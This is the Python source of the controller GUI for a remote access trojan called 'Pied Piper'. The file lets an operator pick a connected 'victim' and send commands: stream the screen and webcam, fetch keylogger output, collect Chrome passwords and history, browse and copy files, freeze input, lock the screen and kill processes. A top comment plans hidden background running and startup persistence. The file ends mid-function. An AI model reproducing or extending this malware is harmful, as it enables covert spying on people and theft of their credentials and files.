import os
import socket
import threading
import time
from tkinter.ttk import Style

import PIL
import rsa
import pickle
from Client import Client
from PIL import ImageTk
from PIL.Image import Image
from ScreenStream import ScreenStream
from StoppableThread import StoppableThread
from SymmetricEncryption import SymmetricEncryption
from tkinter import messagebox, simpledialog, ttk, filedialog, Button, Tk, Label, Toplevel, HORIZONTAL, Frame, Canvas, \
    LEFT, BOTH, RIGHT, Y, VERTICAL

from win32com.shell import shell, shellcon

"""
I have to find out how to run RAT as background process without being seen (for gamma)
And add it to start up
"""


class PiperClient(Client):
    def __init__(self, server_ip, server_port, delta_time_check=2):
        """
        This is the initiate function of a piper client object,
        initiate class values and important objects to the class use like symmetric encryption or GUI.
        In addition, it starts the connection.
        :param server_ip: The Pied Piper main server ip
        :param server_port: The Pied Piper main server port
        :param delta_time_check: the time to wait between each iterative check of statusses important to the client like
        open connection..
        """
        super().__init__(server_ip, server_port, 'Piper')
        print("Initiated server")
        self.server_ip = server_ip
        self.server_port = server_port
        self.port = server_port
        self.delta_time_check = delta_time_check
        # self.public_key, self.private_key = rsa.newkeys(1024)
        self.isAlive_delta_time = delta_time_check * 1000  # mili sec

        self.symmetric_encryption = SymmetricEncryption(None)
        self.rat_public_key = None
        self.isClientInitiated = False
        self.available_rats = []
        self.chosen_rat = ''
        self.has_chrome = False
        self.is_admin = False
        self.files_found = []
        self.streamer = ScreenStream(self)

        self.icon_path = 'piedpiper.ico'
        self.white = '#ffffff'
        self.pied_piper_green = '#017068'  # '#058279'
        self.window_width = 820
        self.window_height = 230
        self.connection_window_width = 810
        self.connection_window_height = 405
        self.is_execute_locked = False

        self.action_btns = []
        self.streaming_btns = []
        self.data_gathering_btns = []
        self.websites_control_btns = []
        self.root = Tk()
        self.root.resizable(0, 0)

        self.current_copy_path = ''
        self.file_exp_top = ...
        self.f = ...
        self.tv = ...
        self.ybar = ...

        self.connection_time = 0.5 # in seconds
        try:
            img = PIL.Image.open("gilfoyle_shows_connecting.jpg")
            tkimage = ImageTk.PhotoImage(img)
            self.gilfoyleImageLabel_connect = Label(self.root, image=tkimage)
            self.gilfoyleImageLabel_connect.image = tkimage

            img = PIL.Image.open("gilfoyle_disconnecting.jpg")
            tkimage = ImageTk.PhotoImage(img)
            self.gilfoyleImageLabel_disconnect = Label(self.root, image=tkimage)
            self.gilfoyleImageLabel_disconnect.image = tkimage

            img = PIL.Image.open("ThePiedPiper.jpg")
            self.background_img_width, self.background_img_height = img.size
            #img = img.resize((550, 425))
            tkimage = ImageTk.PhotoImage(img)
            self.imagelabel = Label(self.root, image=tkimage)
            self.imagelabel.image = tkimage

        except Exception as e:
            print(e)
            messagebox.showinfo(title='Resources Exception', message='Could not open required resources!')
            return

        self.connection_deter_progressbar = ttk.Progressbar(self.root, orient=HORIZONTAL,
                                                            length=self.window_width / 2, mode='determinate')

        self.notebook = ttk.Notebook(self.root, width=self.window_width, height=self.window_height)
        self.operate_frame = Frame(self.notebook)

        self.operation_notebook = ttk.Notebook(self.operate_frame, width=self.window_width, height=self.window_height)
        self.streaming_frame = Frame(self.operation_notebook)
        self.data_gathering_frame = Frame(self.operation_notebook)
        self.websites_control_frame = Frame(self.operation_notebook)
        self.actions_frame = Frame(self.operation_notebook)
        # Style().configure("TNotebook", background=myTabBarColor)
        # Style().map("TNotebook.Tab", background=[("selected", myActiveTabBackgroundColor)],
        #             foreground=[("selected", myActiveTabForegroundColor)])
        # Style().configure("TNotebook.Tab", background=myTabBackgroundColor, foreground=myTabForegroundColor)
        Style().configure("TNotebook.Tab", background='white', font='Verdana 12')


        self.help_frame = Frame(self.notebook)

        self.help_canvas = Canvas(self.help_frame)
        scrollbar = ttk.Scrollbar(self.help_frame, orient="vertical", command=self.help_canvas.yview)
        self.help_canvas.config(yscrollcommand=scrollbar.set, scrollregion=(0, 0, 100, 500))
        self.help_canvas.pack(side=LEFT, fill=BOTH, expand=True)
        self.help_canvas.bind_all("<MouseWheel>", self._on_mousewheel)
        scrollbar.pack(side=RIGHT, fill=BOTH)

        frame = Frame(self.help_canvas)
        self.help_canvas.create_window(int(self.window_width/2), 240, window=frame)

        help_text = ''
        with open('help.txt', 'r') as f:
            help_text = f.read()
        self.helpLabel = Label(frame, font='Helvetica 10 bold',
                               text=help_text)
        self.helpLabel.pack(side=LEFT, fill=BOTH)

        self.rats_combo_box = ttk.Combobox(self.root,
                                           values=self.available_rats, width=40, state="readonly")

        self.indeter_progressbar = ttk.Progressbar(self.data_gathering_frame, orient=HORIZONTAL,
                                                   length=self.window_width/2, mode='indeterminate')
        self.deter_progressbar = ttk.Progressbar(self.data_gathering_frame, orient=HORIZONTAL,
                                                 length=self.window_width/2, mode='determinate')
        self.progress_status_label = Label(self.data_gathering_frame, font='Helvetica 14 bold')

        # self.titleLabel = Label(self.root, fg='green', font='Helvetica 16 bold underline',
        #                       text="Pied Piper - Remote Access Trojan")

        self.labelTop = Label(self.root, font='Helvetica 14 bold',
                              text="Choose an available RAT to attack: ")
        # self.creditLabel = Label(self.root, fg='red', font='Helvetica 18 bold',
        #                         text="Developed By Omer Sela©")

        self.documents_path = shell.SHGetFolderPath(0, shellcon.CSIDL_PERSONAL, None, 0)
        self.desktop_path = shell.SHGetFolderPath(0, shellcon.CSIDL_DESKTOP, 0, 0)
        self.chosen_path = self.desktop_path
        self.chosen_file = ''

        self.init_client()
        print("Initiated client")
        self.update_available_rats_thread = StoppableThread(target=self.update_available_rats)
        self.update_available_rats_thread.start()
        self.connect_to_rat_thread = StoppableThread(target=self.connect_to_rat)
        # self.connect_to_rat_thread.start()
        self.init_ui()

    def _on_mousewheel(self, event):
        self.help_canvas.yview_scroll(int(-1 * (event.delta / 120)), "units")

    def update_available_rats(self):
        """
        trying to receive the available running rats and showing them in the GUI
        """
        print("updating available rats")
        try:
            available_rats_string = self.recv(1024, decrypt=False).decode()
        except:
            available_rats_string = '0'
        print(available_rats_string)
        if available_rats_string == '0':
            # do something because no rats are available
            while available_rats_string == '0':
                self.send('ack, none available'.encode(), encrypt=False)
                available_rats_string = self.recv(1024, decrypt=False).decode()
                # time.sleep(self.delta_time_check)
                # print("None available rats, checking again...")

        self.available_rats = available_rats_string.split(',')
        print(self.available_rats)
        self.rats_combo_box.configure(values=self.available_rats)
        self.update_available_rats_thread.stop()

        self.rats_combo_box.set('')
        self.choose_rat()

    def choose_rat(self):
        """
        After the receiving of the available ones, the user gets the option toi choose a rat he wants to control
        :return:
        """
        # print("chosen rat loop")
        if self.connect_to_rat_thread.stopped():
            print("exsited thread")
            exit(1)
        else:
            self.chosen_rat = self.rats_combo_box.get()

        if self.chosen_rat == '':
            self.root.after(10, self.choose_rat)
        else:
            self.connect_to_rat()

    def connect_to_rat(self):
        """
        Starts the connnection with the chosen rat, transfers important parameters for safe connection
        and update GUI
        :return:
        """
        print("connecting to new rat...")
        print("chosen rat is: ", self.chosen_rat)
        self.send(self.chosen_rat.encode(), encrypt=False)
        response = self.recv(1024, decrypt=False)
        if response.decode() == 'NotFound':
            self.close_client('The Rat you chose is not available anymore, restart.')

        try:
            self.rat_public_rsa_key = pickle.loads(self.my_socket.recv(1024))
        except Exception as e:
            self.sockets_error(str(e))

        encrypted_key = rsa.encrypt(self.symmetric_encryption.get_key(), self.rat_public_rsa_key)
        print('skey is: ', self.symmetric_encryption.get_key())

        try:
            self.my_socket.send(encrypted_key)
        except Exception as e:
            self.sockets_error(str(e))

        print("set encryption")
        self.send("Do you have chrome installed?".encode())
        self.has_chrome = self.recv(1024).decode()
        self.has_chrome = True if self.has_chrome == 'True' else False
        print("The client has chrome = ", self.has_chrome)
        self.send("Got Chrome state".encode())

        self.is_admin = self.recv(1024).decode()
        self.is_admin = True if self.is_admin == 'True' else False
        print("The client is admin = ", self.is_admin)
        self.send("Got is admin state".encode())

        self.recv(1024)  # initiation complete
        self.isClientInitiated = True

        self.imagelabel.place_forget()
        self.hide_available_rats_combobox()
        self.root.title("Pied Piper - Victim: " + self.chosen_rat)
        self.connection_ui(self.gilfoyleImageLabel_connect)

        self.root.geometry(str(self.window_width) + 'x' + str(self.window_height) + '+400+300')
        self.notebook.grid()
        self.operation_notebook.grid()
        self.grid_btns()

    def connection_progressbar(self):
        self.connection_deter_progressbar.configure(maximum=int(self.connection_time * 100))
        self.connection_deter_progressbar.place(x=self.connection_window_width / 4, y=self.connection_window_height / 2)
        self.root.update()

        for i in range(int(self.connection_time * 100)):
            self.connection_deter_progressbar['value'] += 1
            # Keep updating the master object to redraw the progress bar
            self.root.update()
            time.sleep(0.01)

        self.connection_deter_progressbar['value'] = 0

    def connection_ui(self, imgLabel):
        self.root.update()
        self.root.geometry(str(self.connection_window_width) + 'x' + str(self.connection_window_height) + '+400+300')
        imgLabel.place(x=0, y=0, relwidth=1, relheight=1)

        self.connection_progressbar()

        imgLabel.place_forget()
        self.connection_deter_progressbar.place_forget()
        self.root.update()

    def on_closing_tk(self):
        """
        sets the required stuff to do on close in order to quit smoothly
        :return:
        """
        if messagebox.askokcancel("Quit", "Do you want to quit?"):
            self.connect_to_rat_thread.stop()
            try:
                self.my_socket.send(b'close')
                self.root.destroy()
            except Exception as e:
                self.root.destroy()
                self.sockets_error(str(e))
            # self.keylogging_thread.stop()

    def close_client(self, message):
        """
        announce if a connection is closed and destroys GUI
        :param message:
        :return:
        """
        # whatever you need to do when the connection is dropped
        messagebox.showinfo(title='Connection Closed', message=message)
        self.root.destroy()
        exit(1)

    def isAlive(self):
        """
        Iterative check for a live connection.
        :return:
        """
        if not self.isClientInitiated:
            print("is not initiated")
            return

        print("Checking if connection is alive")
        try:
            self.my_socket.send(b'')
        except ConnectionResetError:
            self.close_client('The server was closed, I am going to sleep for now...')
        except socket.timeout:
            self.close_client('The server was closed, I am going to sleep for now...')
        except socket.error:
            self.close_client('The server was closed, I am going to sleep for now...')
        except:
            pass

        self.root.after(self.isAlive_delta_time, self.isAlive)

    def init_ui(self):
        """
        Initiates tkinter GUI, and starts the main tkinter loop.
        :return:
        """
        print("Initiating UI")
        self.root.title("Pied Piper")
        self.root.configure(bg=self.white)
        try:
            self.root.iconbitmap(self.icon_path)
        except:
            print("couldnt open icon")

        button_activity_width = 20
        self.root.geometry(str(self.window_width) + 'x' + str(self.window_height) + '+400+300')
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing_tk)

        self.streaming_btns.append(Button(self.streaming_frame, text="Stream Screen", fg='white', bg=self.pied_piper_green,
                                       font='Helvetica 11 bold', width=button_activity_width,
                                       command=lambda : self.execute_command(self.stream_screen_tcp)))

        self.streaming_btns.append(Button(self.streaming_frame, text="Stream Camera", fg='white', bg=self.pied_piper_green,
                                       font='Helvetica 11 bold', width=button_activity_width,
                                       command=lambda : self.execute_command(self.stream_camera)))

        self.websites_control_btns.append(Button(self.websites_control_frame, text="Open Website",
                                                 fg='white', bg=self.pied_piper_green,
                                       font='Helvetica 11 bold', width=button_activity_width,
                                       command=lambda: self.execute_command(self.open_website)))

        self.websites_control_btns.append(
            Button(self.websites_control_frame, text="Block Site", fg='white', bg=self.pied_piper_green,
                   font='Helvetica 11 bold', width=button_activity_width,
                   command=lambda: self.execute_command(self.block_site)))

        self.websites_control_btns.append(
            Button(self.websites_control_frame, text="Release Blocked Site", fg='white', bg=self.pied_piper_green,
                   font='Helvetica 11 bold', width=button_activity_width,
                   command=lambda: self.execute_command(self.release_blocked_site)))

        self.websites_control_btns.append(
            Button(self.websites_control_frame, text="Release All Blocked Site", fg='white', bg=self.pied_piper_green,
                   font='Helvetica 11 bold', width=button_activity_width,
                   command=lambda: self.execute_command(self.release_all_blocked_site)))


        self.action_btns.append(Button(self.actions_frame, text="Popup Message", fg='white', bg=self.pied_piper_green,
                                       font='Helvetica 11 bold', width=button_activity_width,
                                       command=lambda: self.execute_command(self.popup_message)))

        self.action_btns.append(Button(self.actions_frame, text="Lock Screen", fg='white', bg=self.pied_piper_green,
                                       font='Helvetica 11 bold', width=button_activity_width,
                                       command=lambda: self.execute_command(self.lock_screen)))

        self.action_btns.append(Button(self.actions_frame, text="Kill Processes", fg='white', bg=self.pied_piper_green,
                                       font='Helvetica 11 bold', width=button_activity_width,
                                       command=lambda: self.execute_command(self.kill_process_by_name)))

        self.action_btns.append(
            Button(self.actions_frame, text="Freeze Mouse and Keyboard", fg='white', bg=self.pied_piper_green,
                   font='Helvetica 11 bold', width=int(button_activity_width * 1.2),
                   command=lambda: self.execute_command(self.freeze_mouse_and_keyboard)))

        self.action_btns.append(
            Button(self.actions_frame, text="Add Desktop Goose", fg='white', bg=self.pied_piper_green,
                   font='Helvetica 11 bold', width=button_activity_width,
                   command=lambda: self.execute_command(self.run_desktop_goose)))

        self.action_btns.append(
            Button(self.actions_frame, text="Kill Desktop Geese", fg='white', bg=self.pied_piper_green,
                   font='Helvetica 11 bold', width=button_activity_width,
                   command=lambda: self.execute_command(self.kill_desktop_geese)))

        self.action_btns.append(
            Button(self.actions_frame, text="Unfreeze Mouse and Keyboard", fg='white', bg=self.pied_piper_green,
                   font='Helvetica 11 bold', width=int(button_activity_width*1.2),
                   command=lambda: self.execute_command(self.unfreeze_mouse_and_keyboard)))

        self.data_gathering_btns.append(Button(self.data_gathering_frame, text="Import Keyboard Input",
                                               fg='white', bg=self.pied_piper_green,
                                       font='Helvetica 11 bold', width=button_activity_width,
                                       command=lambda : self.execute_command(self.choose_location_and_request,
                                                                             ('keyboard_log', self.request_keyboard_input))))

        self.data_gathering_btns.append(Button(self.data_gathering_frame, text="Import Chrome History",
                                               fg='white', bg=self.pied_piper_green,
                                       font='Helvetica 11 bold', width=button_activity_width,
                                       command=lambda : self.execute_command(self.import_chrome_history)))

        self.data_gathering_btns.append(Button(self.data_gathering_frame, text="Collect Chrome Data",
                                               fg='white', bg=self.pied_piper_green,
                                       font='Helvetica 11 bold', width=button_activity_width,
                                       command=lambda: self.execute_command(self.collect_chrome_data)))

        self.data_gathering_btns.append(Button(self.data_gathering_frame, text="Show Active Processes",
                                               fg='white', bg=self.pied_piper_green,
                                       font='Helvetica 11 bold', width=button_activity_width,
                                       command=lambda : self.execute_command(self.active_processes)))

        self.data_gathering_btns.append(
            Button(self.data_gathering_frame, text="Copy File", fg='white', bg=self.pied_piper_green,
                   font='Helvetica 11 bold', width=button_activity_width,
                   command=lambda: self.execute_command(self.copy_file)))

        self.streaming_btns.append(Button(self.streaming_frame, text="Disconnect", fg='black', bg='red',
                                       font='Helvetica 11 bold', width=button_activity_width,
                                       command=lambda : self.execute_command(self.disconnect_from_rat)))
        self.data_gathering_btns.append(Button(self.data_gathering_frame, text="Disconnect", fg='black', bg='red',
                                       font='Helvetica 11 bold', width=button_activity_width,
                                       command=lambda: self.execute_command(self.disconnect_from_rat)))
        self.action_btns.append(Button(self.actions_frame, text="Disconnect", fg='black', bg='red',
                                       font='Helvetica 11 bold', width=button_activity_width,
                                       command=lambda: self.execute_command(self.disconnect_from_rat)))
        self.websites_control_btns.append(Button(self.websites_control_frame, text="Disconnect", fg='black', bg='red',
                                       font='Helvetica 11 bold', width=button_activity_width,
                                       command=lambda: self.execute_command(self.disconnect_from_rat)))

        # self.grid_action_btns()
        self.notebook.add(self.operate_frame, text="Operate Victim")
        self.notebook.add(self.help_frame, text="Help")

        self.operation_notebook.add(self.streaming_frame, text="Streaming")
        self.operation_notebook.add(self.data_gathering_frame, text="Data Gathering")
        self.operation_notebook.add(self.websites_control_frame, text="Websites Control")
        self.operation_notebook.add(self.actions_frame, text="Actions")

        self.grid_combobox()

        self.root.after(self.isAlive_delta_time, self.isAlive)
        self.root.mainloop()

    def hide_available_rats_combobox(self):
        """
        hides the choose rat combobox
        :return:
        """
        # self.titleLabel.grid_forget()
        # self.creditLabel.grid_forget()
        self.labelTop.place_forget()
        self.rats_combo_box.place_forget()

    def grid_combobox(self):
        """
        shows the choose rat combobox and image
        :return:
        """
        self.root.geometry(str(self.background_img_width) + 'x' + str(self.background_img_height) + '+400+300')
        self.imagelabel.place(x=0, y=0, relwidth=1, relheight=1)

        # self.labelTop.place(x=150, y=380)
        # self.rats_combo_box.place(x=150, y=410)
        self.labelTop.place(x=150, y=380)
        self.rats_combo_box.place(x=150, y=410)

        #self.titleLabel.grid(row=0,column=0, pady=(20, 20))
        # self.labelTop.grid(row=1, column=0)
        # self.rats_combo_box.grid(row=2, column=0)
        #self.imagelabel.grid(row=3,column=0, padx=(50, 20), pady=(20, 20))
        #self.creditLabel.grid(row=4, column=0)

    def grid_btns(self, btns=None):
        """
        shows the choose actions buttons
        :return:
        """
        if btns is None:
            btns = [self.streaming_btns, self.data_gathering_btns, self.action_btns, self.websites_control_btns]
        else:
            btns = [btns]
        for btn_group in btns:
            row_i = 2
            column_i = 0
            for btn in btn_group:
                if column_i == 3:
                    column_i = 0
                    row_i += 1
                btn.grid(row=row_i, column=column_i, padx=(50, 20), pady=(10, 10))
                column_i += 1

    def hide_btns(self, btns=None):
        """
        hides the choose actions buttons
        :return:
        """
        if btns is None:
            btns = [self.streaming_btns, self.data_gathering_btns, self.action_btns, self.websites_control_btns]
        else:
            btns = [btns]
        print("Hiding action buttons")
        for btn_group in btns:
            for btn in btn_group:
                btn.grid_forget()


    def disable_action_btns(self, btns=None):
        """
        disable action buttons to prevent collision
        :return:
        """
        print("in disable action buttons")
        if btns is None:
            btns = [self.streaming_btns, self.data_gathering_btns, self.action_btns, self.websites_control_btns]
        else:
            btns = [btns]
        for btn_group in btns:
            for btn in btn_group:
                btn['state'] = 'disabled'
                btn.update()

    def enable_action_btns(self, btns=None):
        """
        enable action buttons
        :return:
        """
        if btns is None:
            btns = [self.streaming_btns, self.data_gathering_btns, self.action_btns, self.websites_control_btns]
        else:
            btns = [btns]

        for btn_group in btns:
            for btn in btn_group:
                btn.update()
                btn['state'] = 'normal'
                btn.update()

    def start_progressbar(self, thread_executed):
        """
        a function that starts the progress bar of loading or downloading while another thread is executed
        """
        self.root.update()
        self.hide_btns(self.data_gathering_btns)
        print("starting progress bar")

        self.progress_status_label['text'] = 'Collecting Data...'
        self.progress_status_label.place(x=(self.window_width / 2) - 70, y=(self.window_height / 3) - 40)
        self.indeter_progressbar.place(x=self.window_width / 4, y=self.window_height / 3)
        self.root.update()

        while self.overall_size == 0:
            if not thread_executed.is_alive():
                self.indeter_progressbar.place_forget()
                return
            self.indeter_progressbar['value'] = self.indeter_progressbar['value'] +\
                                                1 if self.indeter_progressbar['value'] < 100 else 0
            self.root.update()
            time.sleep(0.01)

        self.indeter_progressbar.place_forget()

        self.progress_status_label['text'] = 'Downloaded 0%'

        self.deter_progressbar.configure(maximum=self.overall_size)
        self.deter_progressbar.place(x=self.window_width/4, y=self.window_height/3)
        self.root.update()

        while thread_executed.is_alive():
            """
            while the thread is alive, it increases the number accordingly to what is left
            """
            #self.progressbar['value'] = self.progressbar['value'] + 1 if self.progressbar['value'] < 100 else 0
            self.deter_progressbar['value'] = self.overall_size - self.size_left
            if self.overall_size == 0:
                precentage = 100
            else:
                precentage = int(((self.overall_size - self.size_left)/self.overall_size) * 100)
            self.progress_status_label['text'] = 'Downloaded ' + str(precentage) + '%'
            # Keep updating the master object to redraw the progress bar
            self.root.update()
            time.sleep(0.01)

    def stop_progressbar(self):
        """
        stops the progress bar of loading or downloading, removes it from the gui
        """
        self.root.update()
        self.deter_progressbar.stop()
        self.deter_progressbar.place_forget()
        self.progress_status_label.place_forget()
        self.grid_btns(self.data_gathering_btns)
        self.root.update()


    def execute_command(self, function, arg=None):
        """
        executes the attacker commands and transfers the required arguments
        In addition it makes sure the other buttons are locked so there won't be any clashes
        """
        if self.streamer.isStreaming:
            messagebox.showinfo(title="Slowly Slowly", message="Do not rush, first finish your current execution")
        elif function != self.copy_file:
            self.disable_action_btns()
            if arg is None:
                function()
            else:
                function(arg)
            self.enable_action_btns()
        else:
            if not self.is_execute_locked:
                #self.disable_action_btns()
                if arg is None:
                    function()
                else:
                    function(arg)
                #self.enable_action_btns()
            else:
                messagebox.showinfo(title="Slowly Slowly", message="Do not rush, first finish your current execution")


    def lock_screen(self):
        """
        sends a command to the victim to lock the scree, and waits for confirmation that the command was recieved
        """
        self.send('$LockScreen'.encode())
        self.recv(1024)  # confirmation
        messagebox.showinfo(title="Confirmation", message="The victim screen got locked")

    def freeze_mouse_and_keyboard(self):
        """
        if the victim has a permission to do so, it freezes his mouse and keyboard input, wxcept of ctrl+alt+del
        """
        if not self.is_admin:
            messagebox.showinfo(title='No Permission',
                                message='It seems like the victim user has no permission to control the input state')
            return
        self.send('$FreezeMouseAndKeyboard'.encode())
        self.recv(1024)  # confirmation
        messagebox.showinfo(title="Confirmation", message="The victim's input was blocked")

    def unfreeze_mouse_and_keyboard(self):
        """
        if the victim has a permission to do so, it unfreezes his mouse and keyboard input, wxcept of ctrl+alt+del
        """
        if not self.is_admin:
            messagebox.showinfo(title='No Permission',
                                message='It seems like the victim user has no permission to control the input state')
            return
        self.send('$UnFreezeMouseAndKeyboard'.encode())
        self.recv(1024)  # confirmation
        messagebox.showinfo(title="Confirmation", message="The victim's input was released")

    def request_file_copying(self, file_path):
        """
        if a file in the tree view is clicked, then this function sends a request to the victim's pc to send the file in bytes
        then the file is saved in the copiedFiles folder
        """
        self.send('$CopyFile'.encode())
        self.recv(1024)  # confirmation
        self.send(file_path.encode())
        data_in_bytes = self.recv_large_data()

        my_path = os.path.dirname(os.path.realpath(__file__))
        if not os.path.exists(my_path + '\\copiedFiles\\'):
            os.makedirs(my_path + '\\copiedFiles\\')

        file_name = file_path.split('\\')[-1]

        with open(my_path + '\\copiedFiles\\' + file_name, 'wb') as f:
            f.write(data_in_bytes)
        os.startfile(my_path + '\\copiedFiles')
        self.is_execute_locked = False
        self.enable_action_btns()

    def get_full_path(self, item):
        """
        recursive function that finds the full path of a file or folder by adding the name of the node and all of his parents
        (the folders he is in)
        """
        # print(self.tv.item(item, "text"))
        # print("item: ", item)
        if self.tv.parent(item) == '':
            return self.tv.item(item, "text") + ':'
        return self.get_full_path(self.tv.parent(item)) + '\\' + self.tv.item(item, "text")

    def on_double_click(self, event):
        """
        if a file or a folder in the tree view is clicked, it calls this function, it creates the full path by the node
        and its parents, then, if it is a folder it sends a request to get the files inside it and if it is a file it asks
        to download it
        """
        item = self.tv.identify('item', event.x, event.y)
        print("you clicked on", self.tv.item(item, "text"))
        path = self.tv.item(item, "text")
        if self.tv.parent(item) != '':
            self.current_copy_path = self.get_full_path(item)
        else:
            self.current_copy_path = path + ':\\'
        print("The current full path is:", self.current_copy_path)
        self.send('$isFile'.encode())
        self.recv(1024) #confirmation
        self.send(self.current_copy_path.encode())
        is_file = True if self.recv(1024).decode() == 'True' else False
        if is_file:
            print("you clicked on", self.current_copy_path)
            self.file_exp_top.destroy()
            self.file_exp_top.update()

            t = threading.Thread(target=self.request_file_copying, args=[self.current_copy_path])
            t.start()
            self.start_progressbar(t)
            self.stop_progressbar()
        else:
            self.send('$ListDir'.encode())
            self.recv(1024)  # confirmation
            self.send(self.current_copy_path.encode())
            dir_lst = pickle.loads(self.recv_large_data())
            print("list dir result: ", dir_lst)

            for name in dir_lst:
                self.tv.insert(item, 'end', text=name, open=False)

    def on_closing_fileexplorer(self):
        """
        if the file explorer is closed before choosing file, it closes it and cancel the locks
        """
        if messagebox.askokcancel("Cancel Task", "Do you want to cancel file copying?"):
            try:
                self.is_execute_locked = False
                self.enable_action_btns()
                self.file_exp_top.destroy()
            except Exception as e:
                self.is_execute_locked = False
                self.file_exp_top.destroy()
                self.sockets_error(str(e))
            # self.keylogging_thread.stop()

    def copy_file(self):
        """
        starts the proccess of copying a file from the victims pc, this function opens a file explorer gui
        that uses tkinter tree view, it requests the pc drives and then adds them to the tree view and binds to the
        buttons the on double click function for further commands
        """
        self.disable_action_btns()
        self.is_execute_locked = True
        self.file_exp_top = Toplevel(self.root)
        self.file_exp_top.protocol("WM_DELETE_WINDOW", self.on_closing_fileexplorer)
        self.file_exp_top.geometry('600x200')
        self.file_exp_top.resizable(0, 0)
        self.f = Frame(self.file_exp_top)
        self.tv = ttk.Treeview(self.f, show='tree')
        self.ybar = ttk.Scrollbar(self.f, orient=VERTICAL,
                                  command=self.tv.yview)
        self.tv.configure(yscroll=self.ybar.set)

        self.tv.bind("<Double-1>", self.on_double_click)

        self.tv.heading('#0', text='File Explorer', anchor='w')

        self.send('$RequestDrives'.encode())
        drives_lst = pickle.loads(self.recv_large_data())

        drives_nodes = []
        for drive in drives_lst:
            node = self.tv.insert('', 'end', text=drive, open=False)
            drives_nodes.append(node)

        self.ybar.pack(side=RIGHT, fill=Y)
        self.tv.pack(fill=BOTH)
        self.f.pack(fill=BOTH)

    def popup_message(self):
        """
        sends the server a task of popping up a required message
        :return:
        """
        print('skey is: ', self.symmetric_encryption.get_key())
        answer = simpledialog.askstring(title="Choose Message",
                                        prompt="What message do you want to pop up on the spied pc?",
                                        parent=self.root)
        if answer is not None:
            self.send("$PopupMessage".encode())
            print(self.recv(1024).decode())  # confirmation
            self.send(answer.encode())

    def run_desktop_goose(self):
        """
        sends the victim a command to run the desktop goose software
        """
        messagebox.showinfo(title="Software Rights", message="All rights reserved to samperson.itch.io/desktop-goose")
        self.send("$DesktopGoose".encode())
        self.recv(1024)  # confirmation

    def kill_desktop_geese(self):
        """
        send a task of killing a process
        :return:
        """
        proc_name = 'GooseDesktop.exe'
        self.send('$KillProcByName'.encode())
        self.recv(1024)  # confirmation
        self.send(proc_name.encode())
        status = self.recv(1024).decode()
        messagebox.showinfo(title='Killing Status', message=status)

    def request_active_processes(self):
        """
        sends a request to get all the processes that run on the victim's pc
        """
        print("started")
        self.send('$ActiveProcesses'.encode())
        data_in_bytes = self.recv_large_data()
        file_name = 'active_procs.txt'
        with open(file_name, 'wb') as f:
            f.write(data_in_bytes)
        os.startfile(file_name)

    def active_processes(self):
        """
        sends the rat client a request to view all of his running processes
        :return:
        """
        t = threading.Thread(target=self.request_active_processes)
        t.start()
        self.start_progressbar(t)
        self.stop_progressbar()

    def choose_location_and_request(self, args): # args -> (default_file_name, function)
        """
        opens a simple dialog to choose the file name and where to save it and then it runs a thread of downloading
        """
        file_name = simpledialog.askstring(title="Choose File Name",
                                           prompt="Enter File name: ", parent=self.root)
        if file_name == '':
            file_name = args[0]
        elif file_name is None:
            return
        file_path = filedialog.askdirectory()
        print("The file path is: ", file_path)

        if file_path == '':
            messagebox.showinfo(title='Cancel',
                                message='The execution got canceled, you must choose path in order to continue')
            return

        if file_path is not None:
            if file_path != '':
                file_path += '/'
            t = threading.Thread(target=args[1], args=[file_path, file_name])
            t.start()
            self.start_progressbar(t)
            self.stop_progressbar()

    def request_chrome_data(self, file_path, file_name):
        """
        this function is called from collect_chrome_data fucntion and it sends the actuall request in tcp and then saves the file
        that is recieved
        """
        print("started")
        self.send('$CollectChromeData'.encode())
        data_in_bytes = self.recv_large_data()
        with open(file_path + file_name + '.txt', 'wb') as f:
            f.write(data_in_bytes)
        os.startfile(file_path + file_name + '.txt')

    def collect_chrome_data(self):
        """
        sends a request to the victim to get data that can be found in chrome's local data bases like passwords
        :return:
        """
        if not self.has_chrome:
            messagebox.showinfo(title='Could not find chrome',
                                message='It seems like the victim has no chrome installed in his PC')
            return

        self.choose_location_and_request(('data_collected_from_chrome', self.request_chrome_data))

    def stream_screen_tcp(self):
        """
        sends the rat a task of screen streaming in tcp protocol
        :return:
        """
        messagebox.showinfo(title='How to stop streaming?', message='In order to stop the streaming press ESC.')
        self.send("$ScreenStream".encode())
        # streamer.run()
        streamer_run_thread = threading.Thread(target=self.streamer.run)
        streamer_run_thread.start()


    def stream_camera(self):
        """
        sends the rat a task of camera streaming in tcp protocol
        :return:
        """
        self.send('$isCameraConnected'.encode())
        response = self.recv(1024)
        if response.decode() == 'closed':
            messagebox.askokcancel("Camera Status", "The computer has no opened camera!")
        else:
            messagebox.showinfo(title='How to stop streaming?', message='In order to stop the streaming press ESC.')
            self.send("$CameraStream".encode())
            # streamer.run()
            streamer_run_thread = threading.Thread(target=self.streamer.run)
            streamer_run_thread.start()



    def request_keyboard_input(self, file_path, file_name):
        """
        This function sends a request to the victim to get all the keys that the keylogger catched and it saves it as a text file
        in the location and name it got as parameters
        """
        self.send("$importKeyboardInput".encode())
        file_in_bytes = self.recv_large_data()
        with open(file_path + file_name + '.txt', 'wb') as f:
            f.write(file_in_bytes)

        os.startfile(file_path + file_name + '.txt')

    # def import_keyboard_input(self):
    #     """
    #     sends a request to view all inputted values in keyboard and save them in txt file
    #     :return:
    #     """
    #     file_name = simpledialog.askstring(title="Choose File Name",
    #                                        prompt="Enter File name: ", parent=self.root)
    #     if file_name == '':
    #         file_name = 'keyboard_log'
    #     elif file_name is None:
    #         return
    #     file_path = filedialog.askdirectory()
    #     print("The file path is: ", file_path)
    #
    #     if file_path == '':
    #         messagebox.showinfo(title='Cancel', message='The execution got canceled, you must choose path in order to continue')
    #         return
    #
    #     if file_path is not None:
    #         if file_path != '':
    #             file_path += '/'
    #         t = threading.Thread(target=self.request_keyboard_input, args=[file_path, file_name])
    #         t.start()
    #
    #         self.start_progressbar(t)
    #         self.stop_progressbar()

    # def import_http_activity(self):
    #     # not updated function, old,
    #     file_name = simpledialog.askstring(title="Choose File Name",
    #                                        prompt="Enter File name: ", parent=self.root)
    #     if file_name is None:
    #         file_name = 'network_log'
    #     file_path = filedialog.askdirectory()
    #     if file_path is not None:
    #         if file_path != '':
    #             file_path += '/'
    #         self.send("$importNetworkActivity".encode())
    #         file_in_bytes = self.recv_large_data()
    #         with open(file_path + file_name + '.txt', 'wb') as f:
    #             f.write(file_in_bytes)
    #
    #         os.startfile(file_path + file_name + '.txt')

    def request_chrome_history(self, file_path, file_name):
        """
        sends the request to the victim to get chrome history written in txt file and then saves it and opens it
        """
        self.send("$importChromeHistory".encode())
